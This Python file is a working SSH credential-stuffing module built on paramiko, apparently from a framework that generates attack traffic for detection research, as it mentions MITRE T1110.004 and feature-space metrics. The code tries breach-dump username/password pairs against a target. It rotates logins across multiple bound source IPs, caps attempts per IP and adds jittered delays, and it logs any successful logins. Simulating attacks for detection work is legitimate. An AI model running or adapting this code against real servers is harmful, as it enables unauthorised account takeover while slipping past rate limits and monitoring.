"""Credential stuffing attack module using paramiko."""

from __future__ import annotations

import logging
import random
import socket
import time
from datetime import datetime, timezone

import paramiko

from attacks.config import PhaseConfig
from attacks.modules.base import AttackModule, AttackModuleRegistry, AttackResult, TimingProfile


@AttackModuleRegistry.register("credential_stuffing")
class CredentialStuffingModule(AttackModule):
    """SSH credential stuffing from multiple aliased source IPs.

    Unlike brute force (cartesian product of small user/pass lists with retries),
    credential stuffing uses many unique username/password pairs from a breach
    dump, each tried exactly once. Produces high unique_usernames and
    auth_invalid_count in feature space.

    Covers MITRE T1110.004 (TA0006 Credential Access).
    """

    def execute(
        self,
        target: str,
        phase: PhaseConfig,
        ips: list[str],
        rng: random.Random,
        logger: logging.Logger,
    ) -> AttackResult:
        credentials = phase.params.get("credentials")
        if not credentials:
            raise ValueError(
                "credential_stuffing module requires 'credentials' param: "
                "list of [username, password] pairs"
            )

        max_per_ip = phase.params.get("max_attempts_per_ip", 100)
        port = phase.params.get("target_port", 22)
        timing = TimingProfile(phase.timing)
        duration = phase.timing.duration_seconds

        # Shuffle credentials for realism
        creds = [tuple(c) for c in credentials]
        rng.shuffle(creds)

        start_time = datetime.now(timezone.utc)
        deadline = time.monotonic() + duration
        attempts = 0
        successes = 0
        errors: list[str] = []
        ip_attempt_counts: dict[str, int] = {ip: 0 for ip in ips}
        unique_users: set[str] = set()

        logger.info(
            "Starting credential stuffing on %s:%d — %d creds × %d IPs (duration: %ds)",
            target, port, len(creds), len(ips), duration,
        )

        cred_idx = 0
        while time.monotonic() < deadline and cred_idx < len(creds):
            elapsed = time.monotonic() - (deadline - duration)
            progress = min(elapsed / duration, 1.0)

            # Pick an IP that hasn't exhausted its attempt budget
            available_ips = [ip for ip in ips if ip_attempt_counts[ip] < max_per_ip]
            if not available_ips:
                logger.info("All IPs exhausted max attempts, stopping")
                break

            src_ip = rng.choice(available_ips)
            username, password = creds[cred_idx]
            cred_idx += 1

            success = self._try_login(target, port, src_ip, username, password, logger)
            attempts += 1
            ip_attempt_counts[src_ip] += 1
            unique_users.add(username)

            if success:
                successes += 1
                logger.info("SUCCESS: %s@%s from %s", username, target, src_ip)

            # Apply timing profile delay
            delay_ms = timing.get_jitter_ms(progress, rng)
            time.sleep(delay_ms / 1000.0)

        end_time = datetime.now(timezone.utc)
        logger.info(
            "Credential stuffing complete: %d attempts, %d successes, %d unique users",
            attempts, successes, len(unique_users),
        )

        return AttackResult(
            phase_name=phase.name,
            module_name=self.name,
            start_time=start_time,
            end_time=end_time,
            source_ips=ips,
            attempts=attempts,
            successes=successes,
            errors=errors[:10],
            metadata={
                "unique_usernames": len(unique_users),
                "port": port,
                "ip_attempts": dict(ip_attempt_counts),
                "total_credentials": len(creds),
            },
        )

    @staticmethod
    def _try_login(
        target: str,
        port: int,
        src_ip: str,
        username: str,
        password: str,
        logger: logging.Logger,
    ) -> bool:
        """Attempt SSH login, binding to src_ip. Returns True on success."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.bind((src_ip, 0))
            sock.connect((target, port))

            client.connect(
                target,
                port=port,
                username=username,
                password=password,
                sock=sock,
                timeout=10,
                look_for_keys=False,
                allow_agent=False,
            )
            return True
        except paramiko.AuthenticationException:
            return False  # Expected — wrong password
        except Exception as e:
            logger.debug("SSH error %s@%s from %s: %s", username, target, src_ip, e)
            return False
        finally:
            client.close()
